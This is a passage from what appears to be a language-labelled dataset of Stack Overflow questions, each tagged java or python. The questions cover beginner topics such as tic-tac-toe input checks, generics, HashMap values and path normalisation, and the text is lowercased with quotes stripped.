humanwin +     computer   +           (gamenumber - humanwin));       if (kb.hasnextline())   // get rid of stray newline         kb.nextline();      system.out.println();      system.out.println( want to play another game   hit enter. );      system.out.println         ( or are you too chicken  in that case  type in quit. );      reply = kb.nextline();      reply = reply.trim();      if (reply.length() &gt; 4)  // require only 1st 4 to be quit         reply = reply.substring(0  4);   }  while (!reply.tolowercase().equals( quit ));    } public class cup {    arraylist&lt;integer&gt; c = new arraylist&lt;integer&gt;();     public cup()    {       c.add(1);       c.add(2);       c.add(3);    }    //-----------------------    public int count()    {       return c.size();    }    //-----------------------    public int select()    {       // random is a static method in math that returns a double       // value greater than or equal to 0.0 and less than 1.0.       int index = (int)(c.size()*math.random());       return c.get(index);    }    //-----------------------    public void remove(integer move)    {          c.remove(move);    } } </code></pre>,java
compare object to empty tuple with the  is  operator in python 2.x  i m used to seeing <code>if obj is none:</code> in python  and i ve recently come across  <code>if obj is ():</code>. since tuples are not mutable  it sounds like a reasonable internal optimization in the python interpreter to have the empty tuple be a singleton  therefore allowing the use of <code>is</code> rather than requiring <code>==</code>. but is this guaranteed somewhere  since which version of the interpreter     [edit] the question matters because if () is not a singleton and there is a way of producing an empty tuple with a different address  then using <code>is {}</code> is a bug. if it is only guaranteed since python 2.x with x > 0  then it is important to know the value of x if you need to ensure backward compatibility of your code. it is also important to know if this can break your code when using pypy / jython / ironpython...,python

a method for calculating the frequency of digits  i ve written a class that finds the total of an integer by adding up the two digits. for example the digit totals of <code>0  5  12  213  999 and 1111</code> are `0  5  3  6  27 and 4 respectively. i need to write a method:    <code>public static double digittotalfrequency(int max  int digittotal)</code>    this method should <code>return</code> the proportion of numbers which have the given <code>digittotal</code> of all numbers in the range 0  1...max. eg the <code>digittotalfrequency(9  3)</code> is <code>0.1</code> since only one number out of the first 10 numbers has a digit total of 3. also  <code>digittotalfrequency(99 3)</code> is <code>0.04</code> (since out of the first 100 numbers only the numbers 3  12  21  and 30 have a digittotal of 30). i am struggling to do this  help please  thank you.   <pre><code>public static double digittotalfrequency(int max  int digittotal){      int number = max;       while (number&gt;0) {         digittotal = digittotal + (number%10);         number = number/10;       }    return digittotal/max;  }  </code></pre>,java

prompting the user for correct input - tic tac toe game  i m working on a program that simulates the tic-tac-toe game between two players. the program does what i want so far  except for the part where  i ask the players for input. i want the program to check whether the (3 x 3) grid already contains a mark (for example   x  or  o )  and keep prompting the same player for a correct input before switching turns. here is what i have so far:   <pre><code>board = [         0  1  2          3  4  5          6  7  8         ]  def main():     print_instructions()     start = str(input( your game is about to begin. press  q  if you want to quit  or  k  to proceed:  ))     while start !=  q :         get_input1()         get_input2()   def display_board(board):     print(board[0]   |    board[1]    |    board[2])     print( ---------- )     print(board[3]    |    board[4]    |    board[5])     print( ---------- )     print(board[6]    |    board[7]    |    board[8])   def print_instructions():     print( please use the following cell numbers to make your move:  )     display_board(board)   def get_input1():     userinput = input( the first player marks with a  x . type an integer between 0 up to 8 to indiciate where you want to move:  )     userinput = int(userinput)     if userinput &lt; 0 or userinput &gt; 8 or board[userinput] ==  x  or board[userinput] ==  o :         print( wrong input! you cannot move there!  )     else:         board[userinput] =  x       display_board(board)  def get_input2():     userinput = input( turn of second player. you mark with a  o . where would you like to move  type an integer between 0 and 8:  )     userinput = int(userinput)     if userinput &lt; 0 or userinput &gt; 8 or board[userinput] ==  x  or board[userinput] ==  o :         print( wrong input! you cannot move there!  )     else:         board[userinput] =  o       display_board(board)    main() </code></pre>   i still have to write the part where the program decides who the winner is  but i want to get the <code>def get_input</code> function right first. how can i check for a valid input in this case  i tried using a <code>while</code> loop  but that one just kept prompting the user indefinitely without terminating (maybe i did something wrong there). help would be appreciated.,python

global variable assignment issue  i have a problem with assigning global variable names inside a function. here s what the function looks like:   <pre><code>def nodegen(slabel  dlabel  sx  xy  dx  dy  num):    for i in range(1  num + 1):       label = slabel + (i - 1)*dlabel        global vars()[ n  + str(label)]       vars()[ n  + str(label)] = node(label  (sx + i*dx  sy + i*dy))       vars()[ n  + str(label)].info()    </code></pre>   actually  it s not important what the function does. what is important is that it generates a number num of objects. every one of them is assigned a variable n1  n2  ...  nnum (the indices do not necessarily have this sequence  it depends on the dlabel variable  but that s not really important). i want to make these variables global  so i can use them outside the function. the problem is line 4 of the code  since it seems the global statement doesn t work with the vars()[] statement. any ideas on how to solve this problem  i get an  invalid syntax  error message.    thanks in advance.,python

how to specify  type  for generics when invoking their methods  the problem i m having is that javac thinks t doesnt implement compareto(). so how can i do this while still staying  generic . wouldnt casting to specific type defeat the purpose of using generic type    <pre><code>public class tree&lt;t&gt; implements comparable&lt;t&gt; {      private t value;       public t getvalue() {         return value;     }      @override     public int compareto(t arg0) {         // todo auto-generated method stub         if (this.getvalue() != null) {             return this.getvalue().compareto(arg0);        // compilation problem         }     } } </code></pre>,java

how to merge multiple java classes *at runtime*   say you have an application that defines an  entity  (interface) called a  with an accompanying aimpl. and you have third-party plugins that extends the class a into b  c  .. z (with bimpl  ...)  each adding some state and functionality. you also have a  factory  in your application that creates instances of a.    i would like my  user  to load several plugins at the same time  say f  k and w  such that the factory would than create a  super a  instance that would be at the same time a f  k and w. assuming that  interface  and  implementation  are strictly separated  as long as the  super a  implements the interface of f  k and w  it should not mater that it is neither a fimpl  kimpl or wimpl. so a kind of  runtime  multiple-inheritance.    to be precise  i would not have the source code of f  k or w  and the third-party developers should not need to know about each-others extensions.    so  is there some library that makes it easy to merge java classes  ideally with some way of managing  conflicts   for example two classes defining a private method with the same signature  or trying to override the same base-class method.    note: i m looking for something using bytecode manipulation  rather than composition. composition prevents the  extending  classes of overriding methods of the base class  and use-up more memory.    [edit] as i have explained in my comment to @gray  composition is not a good solution for a number of reasons. while you can use it  if you do it properly  you end-up with very many very small classes and interfaces  and a massive amount of glue code to make them look like just one single object. this also has  in addition to a large coding overhead resulting in decreased productivity  the effect that your application uses much more memory and is also a lot slower  due to the added indirections everywhere.    for an application that processes small and short db transactions  composition might be perfect  but for an application that has to keep gigabytes of hot data in ram at all times  which is what i will be doing  this has a very real cost  both in development time  and memory and cpu requirement for the clients and servers.    a solution where you can code  naturally  (interface-first style of programming is how i normally code anyway)  with some limitation on what methods from the base-class you can extend  would be much  cheaper  than composition.,java

issue with using double as value in hashmap  i have a <code>double</code> as the value in hashmap with the key as a string. if i update the variable that was added as a value to the hashmap independently  instead of updating it in the hashmap  the updated value does not get reflected. that is when i use the key to get the value i get the value as 0.0 instead of the updated value. i am not able to understand why this happens. please throw some light on this. also  is there some other way of updating the value in hashmap by updating the variable. a sample code of what i am talking about is below:    <pre><code>import java.util.hashmap; public class testdouble{     public double d1 = 0.0;     public double d2 = 0.0;     public double d3 = 0.0;     private hashmap&lt;string double&gt; hm;      public testdouble(){         hm = new hashmap&lt;string double&gt;();         hm.put( d1  d1);         hm.put( d2  d2);         hm.put( d3  d3);     }      public void updated1(double d){         d1 = d;     }      public void updated2(double d){         d2 = d;     }      public void updated3(double d){         d3 = d;     }     public double getvalue(string key){         double val = (double)hm.get(key);         return val;     }      public static void main(string args[]){         testdouble td =new testdouble();         td.updated1(10.10);         td.updated2(20.20);         td.updated3(30.30);         system.out.println( value of d1 from hashmap =  +td.getvalue( d1 )+  from actual variable =  +td.d1);         system.out.println( value of d2 from hashmap =  +td.getvalue( d2 )+  from actual variable =  +td.d2);         system.out.println( value of d3 from hashmap =  +td.getvalue( d3 )+  from actual variable =  +td.d3);     } } </code></pre>   the output i get is:   <pre><code>value of d1 from hashmap = 0.0 from actual variable = 10.1 value of d2 from hashmap = 0.0 from actual variable = 20.2 value of d3 from hashmap = 0.0 from actual variable = 30.3 </code></pre>,java
reducing a path to simplest value   is there an os.path function to reduce a path to its simplest form  for example  is there a way to reduce <code>/a/b/c/../../</code> to <code>/a/</code>     i ve tried <code>os.path.abspath(url)</code> but this prepends my home directory as well. for example  if i want <code>www.google.com/a/index.html</code> it returns <code>/users/myname/documents/www.google.com/a/index.html</code>    obviously one possible solution is to remove <code>/users/myname/documents/</code> from all paths that i create  but i feel like there must be a better way...,python

how to read a multiple string values from text line and store them to a string variable(java)  i want to read line by line from a text file in java  one line consist of 4 fields but one field can contain multiple words  for ex.: i have this line: <strong>screen</strong>    <strong>commercial</strong>      <strong>problem with product</strong>    how can i store this three fields of my line into 3 string variables in java    <pre><code>var1 -&gt;  screen  var2 -&gt;  commercial  var3 -&gt;  problem with product  </code></pre>,java
randomizing decimal portion of a double  i have the following method which takes in gps coordinates as strings and converts them to doubles with a maximum of 6 decimal points. now i m trying to randomize the decimal points starting from the first decimal.   <pre><code>public void randomizecoordinate(string latstring  string lonstring) {     double lat = double.parsedouble(latstring);     double lon = double.parsedouble(lonstring);      decimalformat df = new decimalformat( #.###### );     df.setroundingmode(roundingmode.half_even);     for (number n : arrays.aslist(lat  lon))     {         double d = n.doublevalue();         system.out.println(df.format(d));     } } </code></pre>   for example if i have 2.34 i want the randomized to be something like 2.493473 or 2.294847 or 2.346758    the first decimal point in which in this case is 3 from 2.34 should only change a maximum of one digit. up or down randomly. the leading decimal points can change to anything in a random fashion.    what would be the best way of doing this,java
compare 2d array to 1d in java  guys i m a bit new in using java and i m trying to write a program that will check the 2d array if it contains the value of 1d array.the second array is like a list of numbers and it will check the first array if they match.   <pre><code>array1[6]= { a   b   c   d   e   f } array2[1][4]={{ a   b   c   d }{ d   e   f   g }} array2[0]= rowcomplete ; // because it contain all the value a b c d array2[1]= incomplete; // because it only match d e f but not g </code></pre>   this is my code:   <pre><code>string array1[] = { a   b   c   d   e   f }; string array2[][] = {{ a   b   c   d }  { d   e   f   g }};  for (int 2row = 0; 2row &lt; array2.length; 2row++) {   for (int 2column = 0;2column&lt; array2[2row].length;2column++) {         for(int 1row=0; 1row &lt; array1[1row].length();1row++) {       if (array2[2row][2column].equals(array1[1row])) {         system.out.println( complete );        }       else{        }     }   } } </code></pre>,java
python count items in list and keep their order of occurrance  given: a list  such as l=[4 4 4 4 5 5 5 6 7 7 7] todo: get the count of an element and keep their occurrence order  e.g.: [(4 4) (5 3) (6 1) (7 3)]    i could do it with:   <pre><code>tmpl    = [(i l.count(i)) for i in l] tmps    = set() cntlist = [x for x in tmpl if x not in tmps and not tmps.add(x)] </code></pre>   but is there a better way  i have seen the link <a href= https://stackoverflow.com/questions/2290962/python-how-to-get-sorted-count-of-items-in-a-list >here</a>  but it sorts the counts and hence breaks the order.    edit: performance is not an issue for the solution  preferable something built-in.,python
passing an array from a constructor to a method   when i try to run it i get this: exception in thread  main  java.lang.arrayindexoutofboundsexception: 0 i want to initialize the array in the constructor simpleintegerstack and use it later on in the methods that follow...   <pre><code>package datastructures.simple_integer_stack;  public class simpleintegerstack { int maxsize; private int stack[]=new int[maxsize];  public simpleintegerstack(int maxsize) {      int stack[]= new int [maxsize]; }  public void push(int element) {     int i=-1;     boolean stop = false;      do{         if(stack[i]==0){             stack[i]=element;             stop=true;         }         i++;      }while(stop=false &amp;&amp; i&lt;stack.length);  }  public void pop() {     int i=0;      while(stack[i]!=0 &amp;&amp; i&lt;stack.length){         i++;     }     if(i!=0)         stack[i] = 0; }  public int top() {     int stacktop=-1;     int i=0;     boolean empty = true;     while(stack[i]!=0 &amp;&amp; i&lt;stack.length-1){         i++;         empty=false;     }     if(i==stack.length-1){         if (stack[i+1]==0){             empty=true;         }         else stacktop=stack[i+1];     }     if(empty=false)         stacktop=stack[i-1];     return stacktop; } </code></pre>   },java
